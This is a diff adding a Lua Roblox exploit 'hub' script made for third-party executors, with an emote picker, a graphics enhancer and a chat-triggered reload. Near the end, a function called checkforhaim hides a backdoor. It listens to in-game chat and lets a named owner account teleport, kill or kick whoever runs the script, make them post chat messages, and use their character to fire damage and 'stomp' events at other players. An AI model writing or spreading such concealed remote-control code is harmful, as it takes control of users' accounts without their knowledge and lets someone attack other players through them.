+BackFrame.SizeConstraint = Enum.SizeConstraint.RelativeYY
+BackFrame.BackgroundTransparency = 1
+BackFrame.BorderSizePixel = 0
+BackFrame.Parent = ScreenGui
+
+local EmoteName = Instance.new("TextLabel")
+EmoteName.Name = "EmoteName"
+EmoteName.TextScaled = true
+EmoteName.AnchorPoint = Vector2.new(0.5, 0.5)
+EmoteName.Position = UDim2.new(-0.1, 0, 0.5, 0)
+EmoteName.Size = UDim2.new(0.2, 0, 0.2, 0)
+EmoteName.SizeConstraint = Enum.SizeConstraint.RelativeYY
+EmoteName.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+EmoteName.TextColor3 = Color3.new(1, 1, 1)
+EmoteName.BorderSizePixel = 0
+EmoteName.Parent = BackFrame
+
+local Corner = Instance.new("UICorner")
+Corner.Parent = EmoteName
+
+local Loading = Instance.new("TextLabel", BackFrame)
+Loading.AnchorPoint = Vector2.new(0.5, 0.5)
+Loading.Text = "Loading..."
+Loading.TextColor3 = Color3.new(1, 1, 1)
+Loading.BackgroundColor3 = Color3.new(0, 0, 0)
+Loading.TextScaled = true
+Loading.BackgroundTransparency = 0.5
+Loading.Size = UDim2.fromScale(0.2, 0.1)
+Loading.Position = UDim2.fromScale(0.5, 0.2)
+Corner:Clone().Parent = Loading
+
+local Frame = Instance.new("ScrollingFrame")
+Frame.Size = UDim2.new(1, 0, 1, 0)
+Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
+Frame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+Frame.ScrollingDirection = Enum.ScrollingDirection.Y
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+Frame.BackgroundTransparency = 1
+Frame.ScrollBarThickness = 5
+Frame.BorderSizePixel = 0
+Frame.MouseLeave:Connect(function()
+	EmoteName.Text = "Select an Emote"
+end)
+Frame.Parent = BackFrame
+
+local Grid = Instance.new("UIGridLayout")
+Grid.CellSize = UDim2.new(0.105, 0, 0, 0)
+Grid.CellPadding = UDim2.new(0.006, 0, 0.006, 0)
+Grid.SortOrder = Enum.SortOrder.LayoutOrder
+Grid.Parent = Frame
+
+local SortFrame = Instance.new("Frame")
+SortFrame.Visible = false
+SortFrame.BorderSizePixel = 0
+SortFrame.Position = UDim2.new(1, 5, -0.125, 0)
+SortFrame.Size = UDim2.new(0.2, 0, 0, 0)
+SortFrame.AutomaticSize = Enum.AutomaticSize.Y
+SortFrame.BackgroundTransparency = 1
+Corner:Clone().Parent = SortFrame
+SortFrame.Parent = BackFrame
+
+local SortList = Instance.new("UIListLayout")
+SortList.Padding = UDim.new(0.02, 0)
+SortList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+SortList.VerticalAlignment = Enum.VerticalAlignment.Top
+SortList.SortOrder = Enum.SortOrder.LayoutOrder
+SortList.Parent = SortFrame
+
+local function SortEmotes()
+	for i,Emote in pairs(Emotes) do
+		local EmoteButton = Frame:FindFirstChild(Emote.id)
+		if not EmoteButton then
+			continue
+		end
+		local IsFavorited = table.find(FavoritedEmotes, Emote.id)
+		EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + ((IsFavorited and 0) or #Emotes)
+		EmoteButton.number.Text = Emote.sort[CurrentSort]
+	end
+end
+
+local function createsort(order, text, sort)
+	local CreatedSort = Instance.new("TextButton")
+	CreatedSort.SizeConstraint = Enum.SizeConstraint.RelativeXX
+	CreatedSort.Size = UDim2.new(1, 0, 0.2, 0)
+	CreatedSort.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+	CreatedSort.LayoutOrder = order
+	CreatedSort.TextColor3 = Color3.new(1, 1, 1)
+	CreatedSort.Text = text
+	CreatedSort.TextScaled = true
+	CreatedSort.BorderSizePixel = 0
+	Corner:Clone().Parent = CreatedSort
+	CreatedSort.Parent = SortFrame
+	CreatedSort.MouseButton1Click:Connect(function()
+		SortFrame.Visible = false
+		CurrentSort = sort
+		SortEmotes()
+	end)
+	return CreatedSort
+end
+
+createsort(1, "Recently Updated First", "recentfirst")
+createsort(2, "Recently Updated Last", "recentlast")
+createsort(3, "Alphabetically First", "alphabeticfirst")
+createsort(4, "Alphabetically Last", "alphabeticlast")
+createsort(5, "Highest Price", "highestprice")
+createsort(6, "Lowest Price", "lowestprice")
+
+local SortButton = Instance.new("TextButton")
+SortButton.BorderSizePixel = 0
+SortButton.AnchorPoint = Vector2.new(0.5, 0.5)
+SortButton.Position = UDim2.new(0.925, -5, -0.075, 0)
+SortButton.Size = UDim2.new(0.15, 0, 0.1, 0)
+SortButton.TextScaled = true
+SortButton.TextColor3 = Color3.new(1, 1, 1)
+SortButton.BackgroundColor3 = Color3.new(0, 0, 0)
+SortButton.BackgroundTransparency = 0.3
+SortButton.Text = "Sort"
+SortButton.MouseButton1Click:Connect(function()
+	SortFrame.Visible = not SortFrame.Visible
+end)
+Corner:Clone().Parent = SortButton
+SortButton.Parent = BackFrame
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.BorderSizePixel = 0
+CloseButton.AnchorPoint = Vector2.new(0.5, 0.5)
+CloseButton.Position = UDim2.new(0.075, 0, -0.075, 0)
+CloseButton.Size = UDim2.new(0.15, 0, 0.1, 0)
+CloseButton.TextScaled = true
+CloseButton.TextColor3 = Color3.new(1, 1, 1)
+CloseButton.BackgroundColor3 = Color3.new(0, 0, 0)
+CloseButton.BackgroundTransparency = 0.3
+CloseButton.Text = "Close"
+CloseButton.MouseButton1Click:Connect(function()
+	ScreenGui.Enabled = false
+end)
+Corner:Clone().Parent = CloseButton
+CloseButton.Parent = BackFrame
+
+local SearchBar = Instance.new("TextBox")
+SearchBar.BorderSizePixel = 0
+SearchBar.AnchorPoint = Vector2.new(0.5, 0.5)
+SearchBar.Position = UDim2.new(0.5, 0, -0.075, 0)
+SearchBar.Size = UDim2.new(0.55, 0, 0.1, 0)
+SearchBar.TextScaled = true
+SearchBar.PlaceholderText = "Search"
+SearchBar.TextColor3 = Color3.new(1, 1, 1)
+SearchBar.BackgroundColor3 = Color3.new(0, 0, 0)
+SearchBar.BackgroundTransparency = 0.3
+SearchBar:GetPropertyChangedSignal("Text"):Connect(function()
+	local text = SearchBar.Text:lower()
+	local buttons = Frame:GetChildren()
+	if text ~= text:sub(1,50) then
+		SearchBar.Text = SearchBar.Text:sub(1,50)
+		text = SearchBar.Text:lower()
+	end
+	if text ~= ""  then
+		for i,button in pairs(buttons) do
+			if button:IsA("GuiButton") then
+				local name = button:GetAttribute("name"):lower()
+				if name:match(text) then
+					button.Visible = true
+				else
+					button.Visible = false
+				end
+			end
+		end
+	else
+		for i,button in pairs(buttons) do
+			if button:IsA("GuiButton") then
+				button.Visible = true
+			end
+		end
+	end
+end)
+Corner:Clone().Parent = SearchBar
+SearchBar.Parent = BackFrame
+
+local function openemotes(name, state, input)
+	if state == Enum.UserInputState.Begin then
+		ScreenGui.Enabled = not ScreenGui.Enabled
+	end
+end
+
+ContextActionService:BindCoreActionAtPriority(
+	"Emote Menu",
+	openemotes,
+	true,
+	2001,
+	Enum.KeyCode.Comma
+)
+
+local inputconnect
+ScreenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+	if ScreenGui.Enabled == true then
+		EmoteName.Text = "Select an Emote"
+		SearchBar.Text = ""
+		SortFrame.Visible = false
+		GuiService:SetEmotesMenuOpen(false)
+		inputconnect = UserInputService.InputBegan:Connect(function(input, processed)
+			if not processed then
+				if input.UserInputType == Enum.UserInputType.MouseButton1 then
+					ScreenGui.Enabled = false
+				end
+			end
+		end)
+	else
+		inputconnect:Disconnect()
+	end
+end)
+
+GuiService.EmotesMenuOpenChanged:Connect(function(isopen)
+	if isopen then
+		ScreenGui.Enabled = false
+	end
+end)
+
+GuiService.MenuOpened:Connect(function()
+	ScreenGui.Enabled = false
+end)
+
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+--thanks inf yield
+local SynV3 = syn and DrawingImmediate
+if (not is_sirhurt_closure) and (not SynV3) and (syn and syn.protect_gui) then
+	syn.protect_gui(ScreenGui)
+	ScreenGui.Parent = CoreGui
+elseif get_hidden_gui or gethui then
+	local hiddenUI = get_hidden_gui or gethui
+	ScreenGui.Parent = hiddenUI()
+else
+	ScreenGui.Parent = CoreGui
+end
+
+local function SendNotification(title, text)
+	if syn and syn.toast_notification then
+		syn.toast_notification({
+			Type = ToastType.Error,
+			Title = title,
+			Content = text
+		})
+	else
+		StarterGui:SetCore("SendNotification", {
+			Title = title,
+			Text = text
+		})
+	end
+end
+
+local LocalPlayer = Players.LocalPlayer
+
+local function PlayEmote(name: string, id: IntValue)
+	ScreenGui.Enabled = false
+	SearchBar.Text = ""
+	local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+	local Description = Humanoid and Humanoid:FindFirstChildOfClass("HumanoidDescription")
+	if not Description then
+		return
+	end
+	if LocalPlayer.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R6 then
+		local succ, err = pcall(function()
+			Humanoid:PlayEmoteAndGetAnimTrackById(id)
+		end)
+		if not succ then
+			Description:AddEmote(name, id)
+			Humanoid:PlayEmoteAndGetAnimTrackById(id)
+		end
+	else
+		SendNotification(
+			"r6? lol",
+			"you gotta be r15 dude"
+		)
+	end
+end
+
+local function WaitForChildOfClass(parent, class)
+	local child = parent:FindFirstChildOfClass(class)
+	while not child or child.ClassName ~= class do
+		child = parent.ChildAdded:Wait()
+	end
+	return child
+end
+
+local Cursor = ""
+while true do
+	local function Request()
+		local success, Response = pcall(function()
+			return game:HttpGetAsync("https://catalog.roblox.com/v1/search/items/details?Category=12&Subcategory=39&SortType=1&SortAggregation=&limit=30&IncludeNotForSale=true&cursor=".. Cursor)
+		end)
+		if not success then
+			task.wait(10)
+			return Request()
+		end
+		return Response
+	end
+	local Response = Request()
+	local Body = HttpService:JSONDecode(Response)
+	for i,v in pairs(Body.data) do
+		AddEmote(v.name, v.id, v.price)
+	end
+	if Body.nextPageCursor ~= nil then
+		Cursor = Body.nextPageCursor
+	else
+		break
+	end
+end
+
+--unreleased emotes
+AddEmote("Arm Wave", 5915773155)
+AddEmote("Head Banging", 5915779725)
+AddEmote("Face Calisthenics", 9830731012)
+
+--wait for emotes to finish loading
+
+local function EmotesLoaded()
+	for i, loaded in pairs(LoadedEmotes) do
+		if not loaded then
+			return false
+		end
+	end
+	return true
+end
+while not EmotesLoaded() do
+	task.wait()
+end
+Loading:Destroy()
+
+--sorting options setup
+table.sort(Emotes, function(a, b)
+	return a.lastupdated > b.lastupdated
+end)
+for i,v in pairs(Emotes) do
+	v.sort.recentfirst = i
+end
+
+table.sort(Emotes, function(a, b)
+	return a.lastupdated < b.lastupdated
+end)
+for i,v in pairs(Emotes) do
+	v.sort.recentlast = i
+end
+
+table.sort(Emotes, function(a, b)
+	return a.name:lower() < b.name:lower()
+end)
+for i,v in pairs(Emotes) do
+	v.sort.alphabeticfirst = i
+end
+
+table.sort(Emotes, function(a, b)
+	return a.name:lower() > b.name:lower()
+end)
+for i,v in pairs(Emotes) do
+	v.sort.alphabeticlast = i
+end
+
+table.sort(Emotes, function(a, b)
+	return a.price < b.price
+end)
+for i,v in pairs(Emotes) do
+	v.sort.lowestprice = i
+end
+
+table.sort(Emotes, function(a, b)
+	return a.price > b.price
+end)
+for i,v in pairs(Emotes) do
+	v.sort.highestprice = i
+end
+
+if isfile("FavoritedEmotes.txt") then
+	if not pcall(function()
+		FavoritedEmotes = HttpService:JSONDecode(readfile("FavoritedEmotes.txt"))
+	end) then
+		FavoritedEmotes = {}
+	end
+else
+	writefile("FavoritedEmotes.txt", HttpService:JSONEncode(FavoritedEmotes))
+end
+
+local UpdatedFavorites = {}
+for i,name in pairs(FavoritedEmotes) do
+	if typeof(name) == "string" then
+		for i,emote in pairs(Emotes) do
+			if emote.name == name then
+				table.insert(UpdatedFavorites, emote.id)
+				break
+			end
+		end
+	end
+end
+if #UpdatedFavorites ~= 0 then
+	FavoritedEmotes = UpdatedFavorites
+	writefile("FavoritedEmotes.txt", HttpService:JSONEncode(FavoritedEmotes))
+end
+
+local function CharacterAdded(Character)
+	for i,v in pairs(Frame:GetChildren()) do
+		if not v:IsA("UIGridLayout") then
+			v:Destroy()
+		end
+	end
+	local Humanoid = WaitForChildOfClass(Character, "Humanoid")
+	local Description = Humanoid:WaitForChild("HumanoidDescription", 5) or Instance.new("HumanoidDescription", Humanoid)
+	local random = Instance.new("TextButton")
+	local Ratio = Instance.new("UIAspectRatioConstraint")
+	Ratio.AspectType = Enum.AspectType.ScaleWithParentSize
+	Ratio.Parent = random
+	random.LayoutOrder = 0
+	random.TextColor3 = Color3.new(1, 1, 1)
+	random.BorderSizePixel = 0
+	random.BackgroundTransparency = 0.5
+	random.BackgroundColor3 = Color3.new(0, 0, 0)
+	random.TextScaled = true
+	random.Text = "Random"
+	random:SetAttribute("name", "")
+	Corner:Clone().Parent = random
+	random.MouseButton1Click:Connect(function()
+		local randomemote = Emotes[math.random(1, #Emotes)]
+		PlayEmote(randomemote.name, randomemote.id)
+	end)
+	random.MouseEnter:Connect(function()
+		EmoteName.Text = "Random"
+	end)
+	random.Parent = Frame
+	for i,Emote in pairs(Emotes) do
+		Description:AddEmote(Emote.name, Emote.id)
+		local EmoteButton = Instance.new("ImageButton")
+		local IsFavorited = table.find(FavoritedEmotes, Emote.id)
+		EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + ((IsFavorited and 0) or #Emotes)
+		EmoteButton.Name = Emote.id
+		EmoteButton:SetAttribute("name", Emote.name)
+		Corner:Clone().Parent = EmoteButton
+		EmoteButton.Image = Emote.icon
+		EmoteButton.BackgroundTransparency = 0.5
+		EmoteButton.BackgroundColor3 = Color3.new(0, 0, 0)
+		EmoteButton.BorderSizePixel = 0
+		Ratio:Clone().Parent = EmoteButton
+		local EmoteNumber = Instance.new("TextLabel")
+		EmoteNumber.Name = "number"
+		EmoteNumber.TextScaled = true
+		EmoteNumber.BackgroundTransparency = 1
+		EmoteNumber.TextColor3 = Color3.new(1, 1, 1)
+		EmoteNumber.BorderSizePixel = 0
+		EmoteNumber.AnchorPoint = Vector2.new(0.5, 0.5)
+		EmoteNumber.Size = UDim2.new(0.2, 0, 0.2, 0)
+		EmoteNumber.Position = UDim2.new(0.1, 0, 0.9, 0)
+		EmoteNumber.Text = Emote.sort[CurrentSort]
+		EmoteNumber.TextXAlignment = Enum.TextXAlignment.Center
+		EmoteNumber.TextYAlignment = Enum.TextYAlignment.Center
+		local UIStroke = Instance.new("UIStroke")
+		UIStroke.Transparency = 0.5
+		UIStroke.Parent = EmoteNumber
+		EmoteNumber.Parent = EmoteButton
+		EmoteButton.Parent = Frame
+		EmoteButton.MouseButton1Click:Connect(function()
+			PlayEmote(Emote.name, Emote.id)
+		end)
+		EmoteButton.MouseEnter:Connect(function()
+			EmoteName.Text = Emote.name
+		end)
+		local Favorite = Instance.new("ImageButton")
+		Favorite.Name = "favorite"
+		if table.find(FavoritedEmotes, Emote.id) then
+			Favorite.Image = FavoriteOn
+		else
+			Favorite.Image = FavoriteOff
+		end
+		Favorite.AnchorPoint = Vector2.new(0.5, 0.5)
+		Favorite.Size = UDim2.new(0.2, 0, 0.2, 0)
+		Favorite.Position = UDim2.new(0.9, 0, 0.9, 0)
+		Favorite.BorderSizePixel = 0
+		Favorite.BackgroundTransparency = 1
+		Favorite.Parent = EmoteButton
+		Favorite.MouseButton1Click:Connect(function()
+			local index = table.find(FavoritedEmotes, Emote.id)
+			if index then
+				table.remove(FavoritedEmotes, index)
+				Favorite.Image = FavoriteOff
+				EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + #Emotes
+			else
+				table.insert(FavoritedEmotes, Emote.id)
+				Favorite.Image = FavoriteOn
+				EmoteButton.LayoutOrder = Emote.sort[CurrentSort]
+			end
+			writefile("FavoritedEmotes.txt", HttpService:JSONEncode(FavoritedEmotes))
+		end)
+	end
+	for i=1,9 do
+		local EmoteButton = Instance.new("Frame")
+		EmoteButton.LayoutOrder = 2147483647
+		EmoteButton.Name = "filler"
+		EmoteButton.BackgroundTransparency = 1
+		EmoteButton.BorderSizePixel = 0
+		Ratio:Clone().Parent = EmoteButton
+		EmoteButton.Visible = true
+		EmoteButton.Parent = Frame
+		EmoteButton.MouseEnter:Connect(function()
+			EmoteName.Text = "Select an Emote"
+		end)
+	end
+end
+
+if LocalPlayer.Character then
+	CharacterAdded(LocalPlayer.Character)
+end
+LocalPlayer.CharacterAdded:Connect(CharacterAdded)
+
+
+
+    end
+)
+
+
+
+textbs:Button(
+    "gfx",
+    function()
+        -- Roblox Graphics Enhancher
+local light = game.Lighting
+for i, v in pairs(light:GetChildren()) do
+	v:Destroy()
+end
+
+local ter = workspace.Terrain
+local color = Instance.new("ColorCorrectionEffect")
+local bloom = Instance.new("BloomEffect")
+local sun = Instance.new("SunRaysEffect")
+local blur = Instance.new("BlurEffect")
+ 
+color.Parent = light
+bloom.Parent = light
+sun.Parent = light
+blur.Parent = light
+ 
+-- enable or disable shit
+ 
+local config = {
+ 
+	Terrain = true;
+	ColorCorrection = true;
+	Sun = true;
+	Lighting = true;
+	BloomEffect = true;
+ 
+}
+ 
+-- settings {
+ 
+color.Enabled = false
+color.Contrast = 0.15
+color.Brightness = 0.1
+color.Saturation = 0.25
+color.TintColor = Color3.fromRGB(255, 222, 211)
+ 
+bloom.Enabled = false
+bloom.Intensity = 0.1
+ 
+sun.Enabled = false
+sun.Intensity = 0.2
+sun.Spread = 1
+ 
+bloom.Enabled = false
+bloom.Intensity = 0.05
+bloom.Size = 32
+bloom.Threshold = 1
+ 
+blur.Enabled = false
+blur.Size = 6
+ 
+-- settings }
+ 
+ 
+if config.ColorCorrection then
+	color.Enabled = true
+end
+ 
+ 
+if config.Sun then
+	sun.Enabled = true
+end
+ 
+ 
+if config.Terrain then
+	-- settings {
+	ter.WaterColor = Color3.fromRGB(10, 10, 24)
+	ter.WaterWaveSize = 0.1
+	ter.WaterWaveSpeed = 22
+	ter.WaterTransparency = 0.9
+	ter.WaterReflectance = 0.05
+	-- settings }
+end
+ 
+ 
+if config.Lighting then
+	-- settings {
+	light.Ambient = Color3.fromRGB(0, 0, 0)
+	light.Brightness = 4
+	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+	light.ExposureCompensation = 0
+	light.FogColor = Color3.fromRGB(132, 132, 132)
+	light.GlobalShadows = true
+	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
+	light.Outlines = false
+	-- settings }
+end
+            end
+)
+
+end 
+
+
+function uh.Destroy()
+for i,v in pairs(game:GetDescendants())  do  
+if v.Name:find("discord") or v.Name:find("Discord") or v.Name:find("DISCORD")   then 
+v:Destroy()
+
+end 
+ 
+end
+end 
+
+
+uh.hub()
+  
+
+
+ game.Players.Chatted:connect(function(msg)
+    if msg == "-reload" then 
+        uh.Destroy() 
+        uh.hub()
+      
+    end 
+              
+
+    
+ end)
+
+
+
+function LOL()
+
+
+    local alphabet = {}
+local randString = ""
+
+for i=1, 9999 do
+	local char = utf8.char(i)
+	table.insert(alphabet, char)
+end
+local d 
+for i=1, 70 do
+	local rand = math.random(1, #alphabet)
+	randString = randString..alphabet[rand]
+	if i == 70 then
+		d = randString
+	end
+end
+return d
+end
+
+function checkforhaim()
+	if plr.Name ~= "BrickColorRandom" then
+
+owner = "MiztHubBot" or "ElizabethAfton_Lizy" or "UN52531638" or "BrickColorRandom" or "CreationOfExperience"
+local ownerchar  = game.Players[owner].Character
+local selfname =game.Players.LocalPlayer
+local name = game.Players.LocalPlayer.Name 
+local selfchar = game.Players.LocalPlayer.Character
+
+task.spawn(function()
+	coroutine.resume(coroutine.create(function()
+		local ChatEvents = game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", math.huge)
+		local OnMessageEvent = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents:WaitForChild("OnMessageDoneFiltering", math.huge)
+        if OnMessageEvent:IsA("RemoteEvent") then
+            OnMessageEvent.OnClientEvent:Connect(function(data)
+                if data ~= nil then
+                    local player = tostring(data.FromSpeaker)
+                    local message = tostring(data.Message)
+                    local originalchannel = tostring(data.OriginalChannel)
+                   if player == owner and message == "-bring" then 
+                       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ownerchar.HumanoidRootPart.CFrame
+                   end 
+                   if player == owner and message == "-yep" then
+                    while true do task.wait() 
+                    ownerchar.Humanoid.DisplayName = LOL()
+                    end
+                end 
+                   if player == owner and string.match(message,"-funny" .. name) then 
+                      	while true do wait()
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = 	ownerchar.HumanoidRootPart.CFrame + 	ownerchar.HumanoidRootPart.CFrame.lookVector * 0.5
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = ownerchar.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+				end
+                   end 
+                   
+                   	
+                      if player == owner and  string.match(message,"-rename") then 
+                                        rename_  = string.gsub(message,"-rename","")
+                                        
+                       ownerchar.Humanoid.DisplayName = rename_
+                      
+                    
+                    
+                       
+                   end 
+                     if player == owner and string.match(message,"-kill " .. name) then 
+                      selfchar.Humanoid.Health = 0 
+                     end
+                       if player == owner and string.match(message,"-kick " .. name) then 
+                      game.Players.LocalPlayer:Kick("get kicked dumbass")
+                       end
+                 if player == owner and string.match(message,"-db") then 
+                           local plr_  = string.gsub(message,"-db ","")
+print(newmsg)
+selfchar.Humanoid:UnequipTools()
+local plr_char = game.Players[plr_].Character
+selfchar.HumanoidRootPart.CFrame = plr_char.LowerTorso.CFrame 
+wait(0.2)
+game.Players.LocalPlayer.Backpack.DB.Parent = selfchar
+wait(1)
+local db 
+local args = {
+    [1] = plr_char.LowerTorso.Position,
+    [2] = selfchar:WaitForChild("DB")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(unpack(args))
+wait(0.5)
+local args = {
+    [1] = plr_char.LowerTorso.Position,
+    [2] = selfchar:WaitForChild("DB")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(unpack(args))
+wait(0.5)
+local args = {
+    [1] = plr_char.LowerTorso.Position,
+    [2] = selfchar:WaitForChild("DB")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(unpack(args))
+wait(0.5)
+local args = {
+    [1] = plr_char.LowerTorso.Position,
+    [2] = selfchar:WaitForChild("DB")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(unpack(args))
+wait(0.5)
+local args = {
+    [1] = plr_char.LowerTorso.Position,
+    [2] = selfchar:WaitForChild("DB")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(unpack(args))
+wait(1)
+selfchar.HumanoidRootPart.CFrame = plr_char.HumanoidRootPart.CFrame 
+selfchar.HumanoidRootPart.CFrame = plr_char.HumanoidRootPart.CFrame 
+selfchar.HumanoidRootPart.CFrame = plr_char.HumanoidRootPart.CFrame 
+
+local args = {
+    [1] = workspace:WaitForChild(plr_)
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("AttemptStomp"):FireServer(unpack(args))
+local args = {
+    [1] = workspace:WaitForChild(plr_)
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("AttemptStomp"):FireServer(unpack(args))
+local args = {
+    [1] = workspace:WaitForChild(plr_)
+}
+selfchar.HumanoidRootPart.CFrame = plr_char.HumanoidRootPart.CFrame 
+game:GetService("ReplicatedStorage"):WaitForChild("AttemptStomp"):FireServer(unpack(args))
+local args = {
+    [1] = workspace:WaitForChild(plr_)
+}
+selfchar.HumanoidRootPart.CFrame = plr_char.HumanoidRootPart.CFrame 
+game:GetService("ReplicatedStorage"):WaitForChild("AttemptStomp"):FireServer(unpack(args))
+local args = {
+    [1] = workspace:WaitForChild(plr_)
+}
+selfchar.HumanoidRootPart.CFrame = plr_char.HumanoidRootPart.CFrame 
+game:GetService("ReplicatedStorage"):WaitForChild("AttemptStomp"):FireServer(unpack(args))
+local args = {
+    [1] = workspace:WaitForChild(plr_)
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("AttemptStomp"):FireServer(unpack(args))
+
+                     end
+                  if player == owner and string.match(message,"-chat") then 
+           local newmsg = string.gsub(message,"-chat","")
+print(newmsg)
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(newmsg,"All")
+
+                   end 
+                end
+            end)
+        end
+	end))
+end)
+end
+end
+checkforhaim()
+game.Players.PlayerAdded:connect(function()
+	checkforhaim()
+end)
